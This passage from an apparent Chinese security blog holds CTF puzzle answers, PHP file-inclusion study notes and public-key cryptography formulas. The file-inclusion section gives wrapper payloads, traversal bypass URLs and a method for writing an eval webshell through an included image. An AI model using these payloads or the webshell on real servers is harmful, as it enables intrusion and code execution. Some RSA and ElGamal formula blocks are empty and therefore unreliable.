</ol>
<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>a</mi><mi>b</mi><mo>=</mo><mi>b</mi><mi>a</mi></mrow><annotation encoding="application/x-tex">ab = ba
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">a</span><span class="mord mathdefault">b</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">b</span><span class="mord mathdefault">a</span></span></span></span></span></p>
<p>则称群G为交换群或阿贝尔群。<br />
6. 群的阶：有限群G中的元素个数称为群的阶，记为|G|。<br />
7. 定理1：一个有乘法的有限集合G，若其乘法在G中封闭，且满足结合律和消去律，则G是群。<br />
8. 循环群：设G是一个群，若存在一个元素a，使得G=&lt;a&gt;,则称G为循环群。元素a称为G的生成元。若<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∘</mo><mo stretchy="false">(</mo><mi>a</mi><mo stretchy="false">)</mo><mo>=</mo><mi mathvariant="normal">∞</mi></mrow><annotation encoding="application/x-tex">\circ(a)=\infty</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∘</span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord">∞</span></span></span></span> ，G称为无限循环群；若<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mo>∘</mo><mo stretchy="false">(</mo><mi>a</mi><mo stretchy="false">)</mo><mo>=</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">\circ(a)=n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∘</span><span class="mopen">(</span><span class="mord mathdefault">a</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span></span></span></span>，n是某个正整数，则G称为有限循环群。</p>
]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>公钥密码</tag>
      </tags>
  </entry>
  <entry>
    <title>NPUCTF writeup</title>
    <url>/CTF/writeup08/</url>
    <content><![CDATA[<h2 id="抽象带师"><a class="markdownIt-Anchor" href="#抽象带师"></a> 抽象带师</h2>
<p><strong>题目：</strong> 题目描述：⭕🦅来🔪西北工✌️带❄️西踢莪🪓🖊赛🔟🎀⬆👄➖单💧🖊赛<br />
大家笑一笑就好，flag格式NPUCTF{}<br />
<strong>解题思路：</strong>  直接谐音读出意思，“欢迎来到西北工业大学CTF比赛世界上最简单的比赛”。</p>
<h2 id="查看源码忘记题目了o_o"><a class="markdownIt-Anchor" href="#查看源码忘记题目了o_o"></a> 查看源码（忘记题目了o(╥﹏╥)o）</h2>
<p><strong>题目：</strong> 无<br />
<strong>解题思路：</strong> 禁止浏览器禁用js即可查看源码，得到flag，<br />
flag{6c1e56dd-496e-4bd3-b3c1-1e2445f155e6}</p>
<h2 id="这是什么觅"><a class="markdownIt-Anchor" href="#这是什么觅"></a> 这是什么觅🐎</h2>
<p><strong>题目：</strong> 无<br />
<strong>解题思路：</strong> 打开图片发现四月的日历和小纸条，字母代表星期的首字母，其中 S 和 T 都出现两次，所以 S1 代表 SAT，S2 代表 SUN ，每组最后一个数字即代表第几行，F1 W1 S22 S21 T12 S11 W1 S13对应得到 3 1 12 5 14 4 1 18，对照字母表 calendar，flag{calendar}。</p>
<h2 id="classical-cipher"><a class="markdownIt-Anchor" href="#classical-cipher"></a> Classical Cipher</h2>
<p><strong>题目：</strong> 看古人如何觅🐎<br />
<strong>解题思路：</strong><br />
打开txt，发现被加密的压缩包密码，明显是埃尔巴什密码，解密得到压缩包密码<br />
the_key_is_atbash<br />
打开图片，发现是猪圈密码+埃及象形文字，对照表解密即可。<br />
flag{classicalcode}</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>文件包含漏洞学习笔记</title>
    <url>/WEB%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="什么是文件包含漏洞"><a class="markdownIt-Anchor" href="#什么是文件包含漏洞"></a> 什么是文件包含漏洞</h1>
<ol>
<li>什么是文件包含？<br />
为了更好地使用代码的 <strong>重用性</strong> ，引入了文件包含函数，可以通过文件包含函数将文件包含进来，直接使用包含文件的代码。</li>
<li>文件包含分为本地文件包含和远程文件包含。</li>
<li>文件包含漏洞的成因是什么？<br />
在包含文件时，为了灵活包含文件，将被包含文件设置为变量，通过动态变量来引入需要包含的文件时，用户可以对变量的值进行改变，而服务器端未对变量的值进行合理性校验或者检验被绕过，这样就导致了文件包含漏洞。通常文件包含漏洞出现在PHP语言中。</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$file = $_GET[<span class="string">'file'</span>];</span><br><span class="line">	<span class="keyword">include</span>($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<h1 id="文件包含函数"><a class="markdownIt-Anchor" href="#文件包含函数"></a> 文件包含函数</h1>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">文件包含：</span><br><span class="line"><span class="keyword">include</span>;</span><br><span class="line"><span class="keyword">include_once</span>;</span><br><span class="line"><span class="keyword">require</span>;</span><br><span class="line"><span class="keyword">require_once</span>;</span><br><span class="line">文件读取：</span><br><span class="line">highlight_file,show_source,readfile,file_get_contents,fopen,file</span><br></pre></td></tr></table></figure>
<p><code>include</code> ，有返回值，如果改函数包含的文件路径有误，不影响下面代码的执行<br />
<code>require</code>，无返回值， 如果改函数包含的文件路径有误，会中断下面代码的执行</p>
<h1 id="文件包含漏洞的利用方式伪协议"><a class="markdownIt-Anchor" href="#文件包含漏洞的利用方式伪协议"></a> 文件包含漏洞的利用方式—伪协议</h1>
<table>
<thead>
<tr>
<th style="text-align:center">协议</th>
<th style="text-align:center">用法</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">file://</td>
<td style="text-align:center">?file=file://D:soft/phpStudy/www/phpcode.txt</td>
</tr>
<tr>
<td style="text-align:center">php://filter</td>
<td style="text-align:center">?file=php://filter/read=convert.base64-encode/resource=./index.php</td>
</tr>
<tr>
<td style="text-align:center">php://input</td>
<td style="text-align:center">?file=php://input      [POST DATA]  &lt;?php phpinfo();?&gt;</td>
</tr>
<tr>
<td style="text-align:center">zip://</td>
<td style="text-align:center">?file=zip:///D:soft/phpStudy/www/file.zip%23phpcode.txt</td>
</tr>
<tr>
<td style="text-align:center">compress.bzip2://</td>
<td style="text-align:center">?file=compress.bzip2:///D:soft/phpStudy/www/file.bz2   [or]     ?file=compress.bzip2://./file.bz2</td>
</tr>
<tr>
<td style="text-align:center">compress.zlib://</td>
<td style="text-align:center">?file=compress.zlib://D:soft/phpStudy/www/file.gz   [or]      ?file=compress.zlib://./file.gz</td>
</tr>
<tr>
<td style="text-align:center">data://</td>
<td style="text-align:center">?file=data://text/plain,&lt;?php phpinfo();?&gt;    [or]      ?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=   [or]   file=data:text/plain,&lt;?php phpinfo();?&gt;    [or]      ?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</td>
</tr>
</tbody>
</table>
<p>说明：</p>
<ul>
<li>php://filter 是一种元封装器，设计用于数据流打开时的筛选过滤。</li>
<li>php://input 可以访问请求的原始数据的只读流，将post请求的数据当做php代码执行。</li>
<li>data:// 同样类似php://input ,可以让用户来控制输入流。</li>
</ul>
<h1 id="文件包含漏洞的利用方式其他"><a class="markdownIt-Anchor" href="#文件包含漏洞的利用方式其他"></a> 文件包含漏洞的利用方式—其他</h1>
<ol>
<li>%00截断绕过<br />
示例：后台php代码</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">"includes/"</span>.$_GET[<span class="string">'page'</span>].<span class="string">".php"</span>);</span><br></pre></td></tr></table></figure>
<p>可以构造url</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">0.5</span><span class="regexp">/?page=../</span>flag.php%<span class="number">00</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li>点加斜杠绕过<br />
示例：后台php代码</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(substr($_GET[<span class="string">'page'</span>],<span class="number">-4</span>,<span class="number">4</span>) != <span class="string">'.php'</span>)   <span class="comment">//取后缀名</span></span><br><span class="line">	<span class="keyword">echo</span> file_get_contents($_GET[<span class="string">'page'</span>]);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'You are not allow to see source files!'</span>;</span><br></pre></td></tr></table></figure>
<p>可以构造url</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">0.5</span><span class="regexp">/?page=../</span>flag.php.</span><br><span class="line">或</span><br><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">0.5</span><span class="regexp">/?page=../</span>flag.php.<span class="regexp">/</span></span><br></pre></td></tr></table></figure>
<ol start="3">
<li>去掉后缀名绕过<br />
示例：后台php代码</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$path = <span class="string">'includes/class_'</span>.addslashes($_GET[<span class="string">'class'</span>]).<span class="string">'.php'</span>;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents($path);</span><br></pre></td></tr></table></figure>
<p>可以构造url</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">0.5</span><span class="regexp">/?class=../</span>flag</span><br></pre></td></tr></table></figure>
<ol start="4">
<li>双写绕过<br />
示例：后台php代码</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$file = str_replace(<span class="string">'../'</span>,<span class="string">''</span>,$_GET[<span class="string">'file'</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($file))</span><br><span class="line">	<span class="keyword">include</span>(<span class="string">"pages/$file"</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="keyword">include</span>(<span class="string">"index.php"</span>);</span><br></pre></td></tr></table></figure>
<p>可以构造url</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">0.5</span><span class="regexp">/?file=.../</span>.<span class="regexp">/flag.php</span></span><br></pre></td></tr></table></figure>
<ol start="5">
<li>文件包含写shell<br />
示例：后台php代码</li>
</ol>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>($_POST[<span class="string">"page"</span>]);</span><br></pre></td></tr></table></figure>
<p>可以利用hackbar添加POST参数</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">page=../image.jpg</span><br><span class="line"></span><br><span class="line">在image.jpg中写入</span><br><span class="line"><span class="meta">&lt;?</span>php fputs(fopen(<span class="string">'shell.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php eval($_POST['</span><span class="keyword">a</span><span class="string">'])?&gt;'</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<ol start="2">
<li>长度截断(Windows:256, Linux:4096)</li>
<li>包含日志文件</li>
<li>包含session</li>
</ol>
<h1 id="文件包含漏洞的防御"><a class="markdownIt-Anchor" href="#文件包含漏洞的防御"></a> 文件包含漏洞的防御</h1>
<ul>
<li>PHP中使用open_basedir 配置限制访问在指定的区域</li>
<li>过滤 . /  \</li>
<li>禁止服务器远程文件包含</li>
<li>尽量不要使用动态文件包含，可在需要包含的页面固定写好</li>
</ul>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>文件包含</tag>
      </tags>
  </entry>
  <entry>
    <title>常见公钥算法加解密公式</title>
    <url>/%E5%AF%86%E7%A0%81%E5%AD%A6/%E5%B8%B8%E8%A7%81%E5%85%AC%E9%92%A5%E7%AE%97%E6%B3%95%E5%8A%A0%E8%A7%A3%E5%AF%86%E5%85%AC%E5%BC%8F/</url>
    <content><![CDATA[<blockquote>
<p>相关基础数学知识请看：<br />
<a href="https://blog.csdn.net/weixin_43790779/article/details/105621372" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43790779/article/details/105621372</a></p>
</blockquote>
<h2 id="rsa-大整数分解"><a class="markdownIt-Anchor" href="#rsa-大整数分解"></a> RSA （大整数分解）</h2>
<ol>
<li>密钥生成：
<ul>
<li>大素数：p、q (至少为1024位 )；</li>
<li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>n</mi><mo>=</mo><mi>p</mi><mo>×</mo><mi>q</mi><mi mathvariant="normal">，</mi><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mi>p</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><mi>q</mi><mo>−</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">n=p×q ，φ(n)=(p-1)(q-1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">n</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">×</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mord cjk_fallback">，</span><span class="mord mathdefault">φ</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.03588em;">q</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span></span></span></span> ，其中 <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>φ</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">φ(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">φ</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span> 是n的欧拉函数值；</li>
<li>选择一整数e，满足1&lt;e&lt;φ(n)，且gcd(φ(n), e)=1；</li>
<li>计算d，满足 d·e ≡1 mod φ(n)；</li>
<li>公钥{e, n}，私钥{d, n}。</li>
</ul>
</li>
<li>加密：<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow></mrow><annotation encoding="application/x-tex"></annotation></semantics></math></span><span class="katex-html" aria-hidden="true"></span></span></span></p>
<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow></mrow><annotation encoding="application/x-tex"></annotation></semantics></math></span><span class="katex-html" aria-hidden="true"></span></span></span></p>
<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow></mrow><annotation encoding="application/x-tex"></annotation></semantics></math></span><span class="katex-html" aria-hidden="true"></span></span></span></p>
<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow></mrow><annotation encoding="application/x-tex">
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"></span></span></span></p>
</li>
<li>密钥生成：
<ul>
<li>p，一个较大的素数；</li>
<li>g，$Z^ * _ p   $  中的生成元；</li>
<li><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>α</mi><mo>∈</mo><msub><mi>Z</mi><mrow><mi>p</mi><mo>−</mo><mn>1</mn></mrow></msub><mo separator="true">,</mo><mi>β</mi><mo>=</mo><msup><mi>g</mi><mi>α</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">\alpha \in Z_{p-1} ,\beta=g^{\alpha} mod p</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5782em;vertical-align:-0.0391em;"></span><span class="mord mathdefault" style="margin-right:0.0037em;">α</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.980548em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">p</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.664392em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.0037em;">α</span></span></span></span></span></span></span></span></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span></span></span></span> ；</li>
<li>p,g,β为公钥；α为私钥；</li>
</ul>
</li>
<li>加密：<br />
随机生成一个秘密数k，<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>k</mi><mo>∈</mo><msub><mi>Z</mi><mrow><mi>p</mi><mo>−</mo><mn>1</mn></mrow></msub></mrow><annotation encoding="application/x-tex">k\in Z_{p-1}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.73354em;vertical-align:-0.0391em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.969438em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.07153em;">Z</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.301108em;"><span style="top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">p</span><span class="mbin mtight">−</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span></span></span></span> 。</li>
</ol>
<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>E</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>k</mi><mo stretchy="false">)</mo><mo>=</mo><mo stretchy="false">(</mo><mi>r</mi><mo separator="true">,</mo><mi>s</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi mathvariant="normal">其</mi><mi mathvariant="normal">中</mi><mi>r</mi><mo>=</mo><msup><mi>g</mi><mi>k</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi><mi>s</mi><mo>=</mo><mi>x</mi><msup><mi>β</mi><mi>k</mi></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi></mrow><annotation encoding="application/x-tex">E(x,k)=(r,s),其中
r=g^k mod p
s=x\beta^k mod p
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault" style="margin-right:0.03148em;">k</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">s</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord cjk_fallback">其</span><span class="mord cjk_fallback">中</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.093548em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mord mathdefault">s</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.093548em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">x</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05278em;">β</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span></span></span></span></span></p>
<ol start="3">
<li>解密：</li>
</ol>
<p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>D</mi><mo stretchy="false">(</mo><mi>r</mi><mo separator="true">,</mo><mi>s</mi><mo stretchy="false">)</mo><mo>=</mo><mi>s</mi><mo stretchy="false">(</mo><msup><mi>r</mi><mi>α</mi></msup><msup><mo stretchy="false">)</mo><mrow><mo>−</mo><mn>1</mn></mrow></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi><mo>=</mo><mi>x</mi><msup><mi>g</mi><mrow><mi>a</mi><mi>k</mi></mrow></msup><msup><mi>g</mi><mrow><mo>−</mo><mi>a</mi><mi>k</mi></mrow></msup><mi>m</mi><mi>o</mi><mi>d</mi><mi>p</mi><mo>=</mo><mi>x</mi></mrow><annotation encoding="application/x-tex">D(r,s)=s(r^\alpha)^{-1} mod p=xg^{ak}g^{-ak}mod p=x
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">D</span><span class="mopen">(</span><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathdefault">s</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.1141079999999999em;vertical-align:-0.25em;"></span><span class="mord mathdefault">s</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.02778em;">r</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7143919999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight" style="margin-right:0.0037em;">α</span></span></span></span></span></span></span></span><span class="mclose"><span class="mclose">)</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.864108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mtight">1</span></span></span></span></span></span></span></span></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.093548em;vertical-align:-0.19444em;"></span><span class="mord mathdefault">x</span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">a</span><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">g</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8991079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">−</span><span class="mord mathdefault mtight">a</span><span class="mord mathdefault mtight" style="margin-right:0.03148em;">k</span></span></span></span></span></span></span></span></span><span class="mord mathdefault">m</span><span class="mord mathdefault">o</span><span class="mord mathdefault">d</span><span class="mord mathdefault">p</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault">x</span></span></span></span></span></p>
<h2 id="椭圆曲线上elgamal秘密椭圆曲线离散对数问题"><a class="markdownIt-Anchor" href="#椭圆曲线上elgamal秘密椭圆曲线离散对数问题"></a> 椭圆曲线上ElGamal秘密（椭圆曲线，离散对数问题）</h2>
<ol>
<li>密钥生成：<br />
在椭圆曲线<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msub><mi>E</mi><mi>p</mi></msub><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">E_p(a,b)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathdefault mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathdefault">a</span><span 